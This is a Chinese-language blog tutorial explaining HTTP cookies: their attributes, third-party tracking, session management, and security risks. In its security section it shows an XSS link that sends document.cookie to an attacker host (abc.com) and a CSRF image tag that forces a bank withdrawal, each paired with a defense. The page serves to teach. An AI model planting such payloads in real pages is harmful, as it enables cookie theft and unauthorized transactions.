<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>cookie | 羊圈</title>
    <meta name="description" content="神羊的羊圈">
    <meta name="theme-color" content="#00adb5">
  <link rel="icon" href="/images/favicon.png">
  <meta itemprop="image" content="/js_tricks/images/favicon.png">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">
  <meta name="msapplication-TileColor" content="#00adb5">
    
    <link rel="preload" href="/assets/css/0.styles.18cbf62c.css" as="style"><link rel="preload" href="/assets/js/app.c1618cf4.js" as="script"><link rel="preload" href="/assets/js/3.ed1bf183.js" as="script"><link rel="preload" href="/assets/js/99.9a6c1efc.js" as="script"><link rel="prefetch" href="/assets/js/1.b3385aaa.js"><link rel="prefetch" href="/assets/js/10.b526617f.js"><link rel="prefetch" href="/assets/js/100.9c76dc44.js"><link rel="prefetch" href="/assets/js/101.6b17334c.js"><link rel="prefetch" href="/assets/js/102.6072298e.js"><link rel="prefetch" href="/assets/js/103.8bf22d9c.js"><link rel="prefetch" href="/assets/js/104.da37280c.js"><link rel="prefetch" href="/assets/js/105.f6adc7cb.js"><link rel="prefetch" href="/assets/js/106.c479af52.js"><link rel="prefetch" href="/assets/js/107.7864a896.js"><link rel="prefetch" href="/assets/js/108.59251a56.js"><link rel="prefetch" href="/assets/js/109.401930b9.js"><link rel="prefetch" href="/assets/js/11.8c8a17aa.js"><link rel="prefetch" href="/assets/js/110.7f385c95.js"><link rel="prefetch" href="/assets/js/111.874ae40f.js"><link rel="prefetch" href="/assets/js/112.b88da53c.js"><link rel="prefetch" href="/assets/js/12.9a241d83.js"><link rel="prefetch" href="/assets/js/13.50f10eff.js"><link rel="prefetch" href="/assets/js/14.e6ebc69a.js"><link rel="prefetch" href="/assets/js/15.1145f768.js"><link rel="prefetch" href="/assets/js/16.8f53c91c.js"><link rel="prefetch" href="/assets/js/17.f5d33107.js"><link rel="prefetch" href="/assets/js/18.0fa172d4.js"><link rel="prefetch" href="/assets/js/19.b3ec819d.js"><link rel="prefetch" href="/assets/js/20.39dd808d.js"><link rel="prefetch" href="/assets/js/21.982519d1.js"><link rel="prefetch" href="/assets/js/22.e43852de.js"><link rel="prefetch" href="/assets/js/23.d20b98a1.js"><link rel="prefetch" href="/assets/js/24.8df2408b.js"><link rel="prefetch" href="/assets/js/25.6b7a2412.js"><link rel="prefetch" href="/assets/js/26.e0d54718.js"><link rel="prefetch" href="/assets/js/27.fa540f01.js"><link rel="prefetch" href="/assets/js/28.12872a08.js"><link rel="prefetch" href="/assets/js/29.a5357381.js"><link rel="prefetch" href="/assets/js/30.877d7c50.js"><link rel="prefetch" href="/assets/js/31.b4278efa.js"><link rel="prefetch" href="/assets/js/32.ebc68bbd.js"><link rel="prefetch" href="/assets/js/33.f08d05c9.js"><link rel="prefetch" href="/assets/js/34.a7d62a8e.js"><link rel="prefetch" href="/assets/js/35.f5d32a01.js"><link rel="prefetch" href="/assets/js/36.1ba48a2d.js"><link rel="prefetch" href="/assets/js/37.3e7062af.js"><link rel="prefetch" href="/assets/js/38.46a40d24.js"><link rel="prefetch" href="/assets/js/39.f11b85d4.js"><link rel="prefetch" href="/assets/js/4.1b01fc51.js"><link rel="prefetch" href="/assets/js/40.28ecd869.js"><link rel="prefetch" href="/assets/js/41.5e8bc3d9.js"><link rel="prefetch" href="/assets/js/42.ff6b4e3c.js"><link rel="prefetch" href="/assets/js/43.9a77ccd5.js"><link rel="prefetch" href="/assets/js/44.b54ec253.js"><link rel="prefetch" href="/assets/js/45.cbee26e2.js"><link rel="prefetch" href="/assets/js/46.5e19d09a.js"><link rel="prefetch" href="/assets/js/47.0acc679f.js"><link rel="prefetch" href="/assets/js/48.bfdd685b.js"><link rel="prefetch" href="/assets/js/49.e42f572c.js"><link rel="prefetch" href="/assets/js/5.d587daef.js"><link rel="prefetch" href="/assets/js/50.85bfbfcd.js"><link rel="prefetch" href="/assets/js/51.576a7373.js"><link rel="prefetch" href="/assets/js/52.f26ffee5.js"><link rel="prefetch" href="/assets/js/53.163cf701.js"><link rel="prefetch" href="/assets/js/54.c1132ecc.js"><link rel="prefetch" href="/assets/js/55.e089f0d4.js"><link rel="prefetch" href="/assets/js/56.be59a8ef.js"><link rel="prefetch" href="/assets/js/57.a015f201.js"><link rel="prefetch" href="/assets/js/58.0235e47f.js"><link rel="prefetch" href="/assets/js/59.0b6f5acf.js"><link rel="prefetch" href="/assets/js/6.69e07e2c.js"><link rel="prefetch" href="/assets/js/60.641c2f95.js"><link rel="prefetch" href="/assets/js/61.17b03fa8.js"><link rel="prefetch" href="/assets/js/62.96134956.js"><link rel="prefetch" href="/assets/js/63.f845d120.js"><link rel="prefetch" href="/assets/js/64.e9ed93d9.js"><link rel="prefetch" href="/assets/js/65.2bd53147.js"><link rel="prefetch" href="/assets/js/66.1f03bf79.js"><link rel="prefetch" href="/assets/js/67.47eb30d1.js"><link rel="prefetch" href="/assets/js/68.cc339c5a.js"><link rel="prefetch" href="/assets/js/69.2ff09789.js"><link rel="prefetch" href="/assets/js/7.3199f861.js"><link rel="prefetch" href="/assets/js/70.9d03d949.js"><link rel="prefetch" href="/assets/js/71.7eab78cd.js"><link rel="prefetch" href="/assets/js/72.20dd5f6e.js"><link rel="prefetch" href="/assets/js/73.6c6af6b0.js"><link rel="prefetch" href="/assets/js/74.8eed043b.js"><link rel="prefetch" href="/assets/js/75.3b5158cd.js"><link rel="prefetch" href="/assets/js/76.0eacd2d9.js"><link rel="prefetch" href="/assets/js/77.c3ba3709.js"><link rel="prefetch" href="/assets/js/78.843656e9.js"><link rel="prefetch" href="/assets/js/79.99bae0b9.js"><link rel="prefetch" href="/assets/js/8.8d4fcdde.js"><link rel="prefetch" href="/assets/js/80.4d3c67b0.js"><link rel="prefetch" href="/assets/js/81.85eaf0e7.js"><link rel="prefetch" href="/assets/js/82.27feb7aa.js"><link rel="prefetch" href="/assets/js/83.7686c618.js"><link rel="prefetch" href="/assets/js/84.941fa5d5.js"><link rel="prefetch" href="/assets/js/85.46a4182a.js"><link rel="prefetch" href="/assets/js/86.1d2fa06f.js"><link rel="prefetch" href="/assets/js/87.1fa71add.js"><link rel="prefetch" href="/assets/js/88.a9a069f0.js"><link rel="prefetch" href="/assets/js/89.93d73858.js"><link rel="prefetch" href="/assets/js/9.99351bd6.js"><link rel="prefetch" href="/assets/js/90.029a12be.js"><link rel="prefetch" href="/assets/js/91.669f4475.js"><link rel="prefetch" href="/assets/js/92.686c84ef.js"><link rel="prefetch" href="/assets/js/93.47bd8585.js"><link rel="prefetch" href="/assets/js/94.0b908759.js"><link rel="prefetch" href="/assets/js/95.f4d85cb9.js"><link rel="prefetch" href="/assets/js/96.e57f6246.js"><link rel="prefetch" href="/assets/js/97.b5660771.js"><link rel="prefetch" href="/assets/js/98.91198c9e.js">
    <link rel="stylesheet" href="/assets/css/0.styles.18cbf62c.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><!----> <span class="site-name">羊圈</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">blog</a></div><div class="nav-item"><a href="https://qishaoxuan.github.io/animate_resume/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  about me
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">blog</a></div><div class="nav-item"><a href="https://qishaoxuan.github.io/animate_resume/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  about me
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading open"><span>JavaScript</span> <span class="arrow down"></span></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/js/1.基础知识.html" class="sidebar-link">基础知识</a></li><li><a href="/js/2.数据类型.html" class="sidebar-link">数据类型</a></li></ul></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>CSS</span> <span class="arrow right"></span></p> <!----></section></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h1 id="cookie">cookie</h1> <h3 id="前言">前言</h3> <p>网络早期最大的问题之一是如何管理状态。简而言之，服务器无法知道两个请求是否来自同一个浏览器。当时最简单的方法是在请求时，在页面中插入一些参数，并在下一个请求中传回参数。这需要使用包含参数的隐藏的表单，或者作为 URL 参数的一部分传递。这两个解决方案都手动操作，容易出错。</p> <p>网景公司当时一名员工 Lou Montulli，在 1994 年将“cookies”的概念应用于网络通信，用来解决用户网上购物的购物车历史记录，目前所有浏览器都支持 cookies。</p> <h3 id="cookie-是什么">cookie 是什么</h3> <p>cookie 翻译过来是“饼干，甜品”的意思，cookie 在网络应用中到处存在，当我们浏览之前访问过的网站，网页中可能会显示：你好，王三少，这就会让我们感觉很亲切，像吃了一块很甜的饼干一样。</p> <p>由于 http 是无状态的协议，一旦客户端和服务器的数据交换完毕，就会断开连接，再次请求，会重新连接，这就说明服务器单从网络连接上是没有办法知道用户身份的。怎么办呢？那就给每次新的用户请求时，给它颁发一个身份证（独一无二）吧，下次访问，必须带上身份证，这样服务器就会知道是谁来访问了，针对不同用户，做出不同的响应。，这就是 Cookie 的原理。</p> <p>其实 cookie 是一个很小的文本文件，是浏览器储存在用户的机器上的。Cookie 是纯文本，没有可执行代码。储存一些服务器需要的信息，每次请求站点，会发送相应的 cookie，这些 cookie 可以用来辨别用户身份信息等作用。</p> <p><img src="https://images2017.cnblogs.com/blog/1203274/201712/1203274-20171209110335937-33858862.png" alt="img"></p> <p>如图所示,用户首次访问服务器，服务器会返回一个独一无二的识别码；id=23451，这样服务器可以用这个码跟踪记录用户的信息，（购物历史，地址信息等）。</p> <p>cookie 可以包含任意的信息，不仅仅是 id，客户端会记录服务器返回来的 Set-Cookie 首部中的 cookie 内容。并将 cookie 存储在浏览器的 cookie 数据库中，当用户访问同一站点时，浏览器就会挑选当时该站点颁发的 id=XXX 的身份证（cookie），并在 Cookie 请求首部发送过去。</p> <h3 id="cookie-的类型">cookie 的类型</h3> <p>可以按照过期时间分为两类：会话 cookie 和持久 cookie。会话 cookie 是一种临时 cookie，用户退出浏览器，会话 Cookie 就会被删除了，持久 cookie 则会储存在硬盘里，保留时间更长，关闭浏览器，重启电脑，它依然存在，通常是持久性的 cookie 会维护某一个用户周期性访问服务器的配置文件或者登录信息。</p> <blockquote><p>持久 cookie 设置一个特定的过期时间（Expires）或者有效期（Max-Age）</p></blockquote> <div class="language- extra-class"><pre class="language-text"><code>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2019 07:28:00 GMT;
</code></pre></div><h3 id="cookie-的属性">cookie 的属性</h3> <h4 id="cookie-的域">cookie 的域</h4> <p>产生 Cookie 的服务器可以向 set-Cookie 响应首部添加一个 Domain 属性来控制哪些站点可以看到那个 cookie，例如下面：</p> <div class="language- extra-class"><pre class="language-text"><code>Set-Cookie: name=&quot;wang&quot;; domain=&quot;m.zhuanzhuan.58.com&quot;
</code></pre></div><p>如果用户访问的是 m.zhuanzhuan.58.com 那就会发送 cookie: name=&quot;wang&quot;, 如果用户访问 www.aaa.com（非 zhuanzhuan.58.com）就不会发送这个 Cookie。</p> <h4 id="cookie-的路径-path">cookie 的路径 Path</h4> <p>Path 属性可以为服务器特定文档指定 Cookie，这个属性设置的 url 且带有这个前缀的 url 路径都是有效的。</p> <p>例如：m.zhuanzhuan.58.com 和 m.zhaunzhuan.58.com/user/这两个 url。 m.zhuanzhuan.58.com 设置 cookie</p> <div class="language- extra-class"><pre class="language-text"><code>Set-cookie: id=&quot;123432&quot;;domain=&quot;m.zhuanzhuan.58.com&quot;;
</code></pre></div><p>m.zhaunzhuan.58.com/user/ 设置 cookie：</p> <div class="language- extra-class"><pre class="language-text"><code>Set-cookie：user=&quot;wang&quot;, domain=&quot;m.zhuanzhuan.58.com&quot;; path=/user/
</code></pre></div><p>但是访问其他路径 m.zhuanzhuan.58.com/other/就会获得</p> <div class="language- extra-class"><pre class="language-text"><code>cookie: id=&quot;123432&quot;
</code></pre></div><p>如果访问 m.zhuanzhuan.58.com/user/就会获得</p> <div class="language- extra-class"><pre class="language-text"><code>  cookie: id=&quot;123432&quot;
  cookie: user=&quot;wang&quot;
</code></pre></div><h4 id="secure">secure</h4> <p>设置了属性 secure，cookie 只有在 https 协议加密情况下才会发送给服务端。但是这并不是最安全的，由于其固有的不安全性，敏感信息也是不应该通过 cookie 传输的.</p> <div class="language- extra-class"><pre class="language-text"><code>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure;
</code></pre></div><blockquote><p>chrome 52 和 firefox 52 开始不安全的（HTTP）是无法使用 secure 的：</p></blockquote> <h3 id="操作-cookie">操作 Cookie</h3> <p>通过 docuemnt.cookie 可以设置和获取 Cookie 的值</p> <div class="language- extra-class"><pre class="language-text"><code>document.cookie = &quot;user=wang&quot;;
console.log(document.cookie);
</code></pre></div><blockquote><p>禁止 javascript 操作 cookie（为避免跨域脚本(xss)攻击，通过 javascript 的 document.cookie 无法访问带有 HttpOnly 标记的 cookie。）</p></blockquote> <div class="language- extra-class"><pre class="language-text"><code>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2017 07:28:00 GMT; Secure; HttpOnly
</code></pre></div><h3 id="第三方-cookie">第三方 cookie</h3> <p>通常 cookie 的域和浏览器地址的域匹配，这被称为第一方 cookie。那么第三方 cookie 就是 cookie 的域和地址栏中的域不匹配，这种 cookie 通常被用在第三方广告网站。为了跟踪用户的浏览记录，并且根据收集的用户的浏览习惯，给用户推送相关的广告。</p> <p><img src="https://images2017.cnblogs.com/blog/1203274/201712/1203274-20171209110357077-116554782.png" alt="img"></p> <p>如上图（a）：用户访问服务器 1 的一个页面 index.html，这个页面和第三方广告网站合作，这个页面还有一张 www.advertisement.com 域名下的一张广告图 ad1.jpg，当请求这张 ad1.jpg 图片的时候，www.advertisement.com 这个服务器会给用户设置 cookie</p> <div class="language- extra-class"><pre class="language-text"><code>Set-Cookie: user=&quot;wang&quot;;like=&quot;a&quot;; domain=&quot;advertisement.com&quot;
</code></pre></div><p>记录用户的浏览记录，分配一个 user 来表示用户的身份。</p> <p>图（b）：用户访问服务器 2 的一个 index.html 页面，这个页面也和同一家广告商合作，这个页面也包含一张 www.advertisement.com 域名下的一张广告图 ad2.jpg，当请求这张 ad2.jpg 图片的时候，浏览器就会向 www.advertisement.com 发送 cookie</p> <div class="language- extra-class"><pre class="language-text"><code>Cookie:  user=&quot;wang&quot;; like=&quot;a&quot;;
</code></pre></div><p>www.advertisement.com 收到浏览器发送的 cookie 识别了用户的身份，同时又把这个页面用户的浏览数据设置 cookie</p> <div class="language- extra-class"><pre class="language-text"><code>Set-Cookie: buy=&quot;b&quot;; domain=&quot;advertisement.com&quot;
</code></pre></div><p>图（c）：很巧，用户访问服务器 3 的一个 index.html 页面，这个页面也和那一家广告商合作，这个页面也包含一张 www.advertisement.com 域名下的一张广告图 ad3.jpg，当请求这张 ad3.jpg 图片的时候，浏览器就会向 www.advertisement.com 发送 cookie</p> <div class="language- extra-class"><pre class="language-text"><code>Cookie:  user=&quot;wang&quot;; like=&quot;a&quot;; buy=&quot;b&quot;
</code></pre></div><p>这样广告公司就可以根据用户的浏览习惯，给用户推送合适的广告。</p> <h3 id="安全">安全</h3> <p>多数网站使用 cookie 作为用户会话的唯一标识，因为其他的方法具有限制和漏洞。如果一个网站使用 cookies 作为会话标识符，攻击者可以通过窃取一套用户的 cookies 来冒充用户的请求。从服务器的角度，它是没法分辨用户和攻击者的，因为用户和攻击者拥有相同的身份验证。 下面介绍几种 cookie 盗用和会话劫持的例子：</p> <h4 id="网络窃听">网络窃听</h4> <p>网络上的流量可以被网络上任何计算机拦截，特别是未加密的开放式 WIFI。这种流量包含在普通的未加密的 HTTP 清求上发送 Cookie。在未加密的情况下，攻击者可以读取网络上的其他用户的信息，包含 HTTP Cookie 的全部内容，以便进行中间的攻击。比如：拦截 cookie 来冒充用户身份执行恶意任务（银行转账等）。</p> <p>解决办法：服务器可以设置 secure 属性的 cookie，这样就只能通过 https 的方式来发送 cookies 了。</p> <h4 id="dns-缓存中毒">DNS 缓存中毒</h4> <p>如果攻击者可以使<a href="http://https//en.wikipedia.org/wiki/DNS_spoofing/" target="_blank" rel="noopener noreferrer">DNS 缓存中毒<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>，那么攻击者就可以访问用户的 Cookie 了，例如：攻击者使用 DNS 中毒来创建一个虚拟的 NDS 服务 h123456.<a href="http://www.demo.xn--comip-6f6hw2bc3fdvhh7bbfw06ls8fp4g168de15a.xn--0mqyb70mbta95cjf75njq1b7od7q7ath1b/" target="_blank" rel="noopener noreferrer">www.demo.com 指向攻击者服务器的 ip 地址。然后攻击者可以从服务器<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a> h123456.<a href="http://www.demo.com/img_01.png" target="_blank" rel="noopener noreferrer">www.demo.com/img_01.png<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a> 发布图片。用户访问这个图片，由于 www.demo.com 和 h123456.www.demo.com 是同一个子域，所以浏览器会把用户的与 www.demo.com 相关的 cookie 都会发送到 h123456.www.demo.com 这个服务器上，这样攻击者就会拿到用户的 cookie 搞事情。</p> <p>一般情况下是不会发生这种情况，通常是网络供应商错误。</p> <h4 id="跨站点脚本-xss">跨站点脚本 XSS</h4> <p>使用跨站点脚本技术可以窃取 cookie。当网站允许使用 javascript 操作 cookie 的时候，就会发生攻击者发布恶意代码攻击用户的会话，同时可以拿到用户的 cookie 信息。</p> <p>例子：</p> <div class="language- extra-class"><pre class="language-text"><code>&lt;a href=&quot;#&quot; onclick=`window.location=http://abc.com?cookie=${docuemnt.cookie}`&gt;领取红包&lt;/a&gt;
</code></pre></div><p>当用户点击这个链接的时候，浏览器就会执行 onclick 里面的代码，结果这个网站用户的 cookie 信息就会被发送到 abc.com 攻击者的服务器。攻击者同样可以拿 cookie 搞事情。</p> <p>解决办法：可以通过 cookie 的 HttpOnly 属性，设置了 HttpOnly 属性，javascript 代码将不能操作 cookie。</p> <h4 id="跨站请求伪造-csrf">跨站请求伪造 CSRF</h4> <p>例如，SanShao 可能正在浏览其他用户 XiaoMing 发布消息的聊天论坛。假设 XiaoMing 制作了一个引用 ShanShao 银行网站的 HTML 图像元素，例如，</p> <div class="language- extra-class"><pre class="language-text"><code>&lt;img  src = &quot;http://www.bank.com/withdraw?user=SanShao&amp;amount=999999&amp;for=XiaoMing&quot; &gt;
</code></pre></div><p>如果 SanShao 的银行将其认证信息保存在 cookie 中，并且 cookie 尚未过期，(当然是没有其他验证身份的东西)，那么 SanShao 的浏览器尝试加载该图片将使用他的 cookie 提交提款表单，从而在未经 SanShao 批准的情况下授权交易。</p> <p>解决办法：增加其他信息的校验（手机验证码，或者其他盾牌）。</p> <h3 id="cookie-session-机制详解">cookie/Session 机制详解</h3> <p>会话（Session）跟踪是 Web 程序中常用的技术，用来跟踪用户的整个会话。常用的会话跟踪技术是 Cookie 与 Session。Cookie 通过在客户端记录信息确定用户身份，Session 通过在服务器端记录信息确定用户身份。</p> <p>在程序中，会话跟踪是很重要的事情。理论上，一个用户的所有请求操作都应该属于同一个会话，而另一个用户的所有请求操作则应该属于另一个会话，二者不能混淆。例如，用户 A 在超市购买的任何商品都应该放在 A 的购物车内，不论是用户 A 什么时间购买的，这都是属于同一个会话的，不能放入用户 B 或用户 C 的购物车内，这不属于同一个会话。
而 Web 应用程序是使用 HTTP 协议传输数据的。HTTP 协议是无状态的协议。一旦数据交换完毕，客户端与服务器端的连接就会关闭，再次交换数据需要建立新的连接。这就意味着服务器无法从连接上跟踪会话。即用户 A 购买了一件商品放入购物车内，当再次购买商品时服务器已经无法判断该购买行为是属于用户 A 的会话还是用户 B 的会话了。要跟踪该会话，必须引入一种机制。
Cookie 就是这样的一种机制。它可以弥补 HTTP 协议无状态的不足。在 Session 出现之前，基本上所有的网站都采用 Cookie 来跟踪会话。</p> <p>很多网站都会使用 Cookie。例如，Google 会向客户端颁发 Cookie，Baidu 也会向客户端颁发 Cookie。那浏览器访问 Google 会不会也携带上 Baidu 颁发的 Cookie 呢？或者 Google 能不能修改 Baidu 颁发的 Cookie 呢？
答案是否定的。Cookie 具有不可跨域名性。根据 Cookie 规范，浏览器访问 Google 只会携带 Google 的 Cookie，而不会携带 Baidu 的 Cookie。Google 也只能操作 Google 的 Cookie，而不能操作 Baidu 的 Cookie。
Cookie 在客户端是由浏览器来管理的。浏览器能够保证 Google 只会操作 Google 的 Cookie 而不会操作 Baidu 的 Cookie，从而保证用户的隐私安全。浏览器判断一个网站是否能操作另一个网站 Cookie 的依据是域名。Google 与 Baidu 的域名不一样，因此 Google 不能操作 Baidu 的 Cookie。
需要注意的是，虽然网站 images.google.com 与网站 www.google.com 同属于 Google，但是域名不一样，二者同样不能互相操作彼此的 Cookie。
注意：用户登录网站 www.google.com 之后会发现访问 images.google.com 时登录信息仍然有效，而普通的 Cookie 是做不到的。这是因为 Google 做了特殊处理。本章后面也会对 Cookie 做类似的处理。</p> <p>Cookie 不仅可以使用 ASCII 字符与 Unicode 字符，还可以使用二进制数据。例如在 Cookie 中使用数字证书，提供安全度。使用二进制数据时也需要进行编码。</p> <p>除了 name 与 value 之外，Cookie 还具有其他几个常用的属性。每个属性对应一个 getter 方法与一个 setter 方法。Cookie 类的所有属性如表 1.1 所示。
表 1.1 Cookie 常用属性
属性名 描述
String name 该 Cookie 的名称。Cookie 一旦创建，名称便不可更改
Object value 该 Cookie 的值。如果值为 Unicode 字符，需要为字符编码。如果值为二进制数据，则需要使用 BASE64 编码
int maxAge 该 Cookie 失效的时间，单位秒。如果为正数，则该 Cookie 在 maxAge 秒之后失效。如果为负数，该 Cookie 为临时 Cookie，关闭浏览器即失效，浏览器也不会以任何形式保存该 Cookie。如果为 0，表示删除该 Cookie。默认为–1
boolean secure 该 Cookie 是否仅被使用安全协议传输。安全协议。安全协议有 HTTPS，SSL 等，在网络上传输数据之前先将数据加密。默认为 false
String path 该 Cookie 的使用路径。如果设置为 “/sessionWeb/”，则只有 contextPath 为“/sessionWeb” 的程序可以访问该 Cookie。如果设置为“/”，则本域名下 contextPath 都可以访问该 Cookie。注意最后一个字符必须为“/”
String domain 可以访问该 Cookie 的域名。如果设置为 “.google.com”，则所有以“google.com” 结尾的域名都可以访问该 Cookie。注意第一个字符必须为“.”
String comment 该 Cookie 的用处说明。浏览器显示 Cookie 信息的时候显示该说明
int version 该 Cookie 使用的版本号。0 表示遵循 Netscape 的 Cookie 规范，1 表示遵循 W3C 的 RFC 2109 规范</p></div> <footer class="page-edit"><!----> <!----></footer> <!----> </main></div><div class="global-ui"><div class="cat-container" data-v-a13867c0><canvas id="vuepress-cat" width="280" height="250" class="live2d" data-v-a13867c0></canvas></div></div></div>
    <script src="/assets/js/app.c1618cf4.js" defer></script><script src="/assets/js/3.ed1bf183.js" defer></script><script src="/assets/js/99.9a6c1efc.js" defer></script>
  </body>
</html>
